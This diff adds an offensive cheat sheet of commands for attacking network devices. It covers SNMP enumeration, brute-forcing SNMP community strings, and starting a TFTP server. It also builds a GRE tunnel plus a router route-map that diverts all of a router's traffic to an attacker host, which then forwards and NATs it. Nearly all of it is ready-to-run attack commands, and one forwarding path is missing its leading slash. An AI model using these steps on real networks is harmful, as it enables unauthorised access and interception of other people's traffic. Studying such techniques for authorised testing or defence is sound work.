@@ -1,0 +1,26 @@
+SNMP Commands & Enumeration----
+SNMP Get----snmpcheck -t <ip-address> -c <community-string>
+Brute Force Community String----snmpbrute -t <ip-address>
+SNMP Walk----snmpwalk -v 2C -c <community-string> <ip-address>
+Start TFTP Server----service atftpd start
+create GRE tunnel----"""
+	modprobe ip_gre
+	iptunnel add mynet mode gre remote <target> local <tun0> ttl 255
+	ip addr add 172.16.0.3/24 dev mynet
+	route add -net 172.16.0.0 netmask 255.255.255.0 dev mynet
+	ifconfig mynet up
+	"""
+Redirect all traffic through GRE tunnel----"""
+	route-map divert permit 10
+	 match ip address 102
+	 set ip next-hop 172.16.0.3
+	
+	 fe 1/0 (internal interface)
+	 ip policy route-map divert
+"""
+Setup Host to Catch GRE Tunnel----"""
+	 echo 1 > proc/sys/net/ipv4/ip_forward
+	 route add -net 10.200.0.0 netmask 255.255.255.0 gw 172.16.0.1
+	 iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+	 iptables --append FORWARD --in-interface mynet -j ACCEPT
+	 """
